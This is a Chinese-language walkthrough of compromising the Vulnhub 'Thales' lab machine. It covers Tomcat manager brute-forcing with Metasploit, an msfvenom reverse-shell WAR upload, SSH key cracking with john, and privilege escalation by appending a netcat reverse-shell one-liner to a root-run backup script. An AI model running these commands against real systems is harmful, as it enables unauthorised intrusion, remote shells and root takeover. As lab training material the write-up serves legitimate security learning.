---

title: Vulnhub--Thales
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. Web站点访问，发现是Tomcat框架，但是该版本不存在CVE
2. MSF尝试爆破Tomcat后台账号密码，成功爆破
3. 进入Tomcat后台后利用上传war程序功能点，进行反弹shell
4. 获取shell后，利用root用户的shell文件成功提权

## 知识扩展

1. MSF模块爆破Tomcat后台账号密码
2. MSF模块生成JAVA后门war程序

## 靶机地址

https://www.vulnhub.com/entry/web-machine-n7,756/

## 主机发现

（1）攻击机

```python
192.168.88.128
```

（2）目标靶机

```py
192.168.88.132
```

## 信息收集

### 端口扫描

![image-20240828170226427](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281702492.png)

### 端口访问

![image-20240828170235947](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281702000.png)

![image-20240828170244250](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281702294.png)

### 目录扫描

![image-20240828170252918](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281702983.png)

### 目录爆破

```python
#对8080端口进行fuzz爆破
ffuf -u http://192.168.88.132:8080/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -e .txt,.zip,.php,html
```

![image-20240828170304802](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281703856.png)

### 目录访问

（1）RELEASE-NOTES.txt文件

![image-20240828170312716](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281703763.png)

（2）/examples/jsp/snp/snoop.jsp

![image-20240828170320524](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281703568.png)

（3）/examples/servlets/servlet/CookieExample

![image-20240828170326900](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281703941.png)

## 实施攻击

（1）目录除了泄露一些中间件信息之外，没有可用价值，因此尝试利用msf爆破后台密码

```python
search login tomcat
```

![image-20240828170335845](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281703903.png)

（2）msf爆破后台密码

```python
use 0
set rhosts 192.168.88.132
run
```

![image-20240828170348492](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281703571.png)

（3）war程序上传getshell

```python
#这里的话需要上传一个可执行程序，php也可上传，但是不可被解析执行
#msf生成java类的反弹shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.88.128  LPORT=8888 -f war -o revshell.war
```

![image-20240828170357816](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281703868.png)

![image-20240828170406805](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281704858.png)

（4）信息收集

![image-20240828175049956](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281750010.png)

![image-20240828170427960](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281704014.png)

![image-20240828170436687](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281704745.png)

（5）suid和sudo不具备提权条件，home目录继续收集其他文件信息

![image-20240828170446689](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281704755.png)

（6）.ssh文件中的私钥可以尝试解密，私钥为用户thales的密码

```py
/usr/share/john/ssh2john.py key.txt > key1.txt
john --wordlist=/usr/share/wordlists/rockyou.txt key1.txt
```

![image-20240828170500988](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281705070.png)

![image-20240828170509579](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281705649.png)

## 提权

（1）找到提示的备份文件，发现是shell文件并且具备可读可写可执行权

![image-20240828170526937](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281705015.png)

（2）执行反弹shell

```python
#此时8888端口正在使用，反弹回7777端口
#直接执行下面这条语句即可反弹shell，用vim打开的话不好添加
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.88.128 7777  >/tmp/f" >> backup.sh
```

![image-20240828175126658](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281751725.png)